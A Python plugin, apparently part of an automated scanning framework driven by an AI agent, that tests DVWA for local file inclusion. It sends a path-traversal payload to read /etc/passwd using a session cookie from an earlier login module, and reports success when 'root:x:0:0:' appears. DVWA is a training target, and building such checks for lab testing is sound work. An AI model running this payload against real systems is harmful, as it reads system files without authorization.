import urllib.request
import re
from typing import Dict, Any
from plugins.base_plugin import BasePlugin

class DVWALFIPlugin(BasePlugin):
    @property
    def METADATA(self) -> Dict[str, Any]:
        return {
            "id": "DVWA-LFI",
            "name": "DVWA Local File Inclusion",
            "cvss_score": 7.5,
            "service": "http",
            "version": "dvwa"
        }

    def match(self, service_info: Dict[str, Any]) -> bool:
        # Kích hoạt nếu Nmap báo đây là dịch vụ Web
        return service_info.get("service", "").lower() in ["http", "https"]

    def verify(self, target_ip: str, target_port: int, context: Dict[str, Any]) -> Dict[str, Any]:
        try:
            url = f"http://{target_ip}:{target_port}/vulnerabilities/fi/?page=../../../../../../etc/passwd"
            req = urllib.request.Request(url)
            
            # LẤY COOKIE ĐỘNG TỪ BỘ NHỚ CONTEXT (Do các Agent/Module trước đó truyền sang)
            dynamic_cookie = context.get("session_cookie", "")
            if not dynamic_cookie:
                return {"status": "PENDING", "evidence": "Chưa có Session Cookie. Yêu cầu AI Agent thực hiện module Login trước."}
                
            req.add_header("Cookie", dynamic_cookie) 
            
            response = urllib.request.urlopen(req, timeout=5)
            body = response.read().decode('utf-8')
            
            if "root:x:0:0:" in body:
                return {"status": "CONFIRMED", "evidence": "Trích xuất thành công /etc/passwd qua payload LFI với session động."}
            else:
                return {"status": "FALSE_POSITIVE", "evidence": "Không đọc được passwd, có thể bị chặn hoặc sai đường dẫn."}
                
        except Exception as e:
            return {"status": "PENDING", "evidence": f"HTTP Error: {str(e)}"}
